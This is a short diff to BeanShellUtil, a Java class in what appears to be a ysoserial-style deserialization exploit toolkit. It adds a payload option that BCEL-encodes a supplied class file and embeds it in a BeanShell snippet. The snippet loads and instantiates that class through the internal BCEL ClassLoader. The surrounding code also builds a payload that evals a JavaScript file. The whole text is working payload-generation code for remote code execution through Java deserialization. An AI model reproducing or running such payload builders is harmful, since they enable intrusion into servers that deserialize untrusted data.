@@ -1,5 +1,6 @@
 package me.gv7.woodpecker.yso.payloads.custom;
 
+import me.gv7.woodpecker.bcel.HackBCELs;
 import me.gv7.woodpecker.yso.Strings;
 import me.gv7.woodpecker.yso.payloads.util.BASE64Decoder;
 import me.gv7.woodpecker.yso.payloads.util.CommonUtil;
@@ -34,7 +35,11 @@ public class BeanShellUtil {
         } else if (command.startsWith(COMMAND_BCEL)) {
             String strBCEL = command.substring(COMMAND_BCEL.length());
             payload = String.format("compare(Object foo, Object bar) { new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();return new Integer(1);}",strBCEL);
-        } else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
+        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE)){
+            String bcelClassFile = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
+            String strBCEL = HackBCELs.encode(bcelClassFile);
+            payload = String.format("compare(Object foo, Object bar) { new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();return new Integer(1);}",strBCEL);
+        }else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
             String scriptFilePath = command.substring(COMMAND_SCRIPT_FILE.length());
             String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
             payload = String.format("compare(Object foo, Object bar) {new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));return new Integer(1);}",scriptFileByteCode);
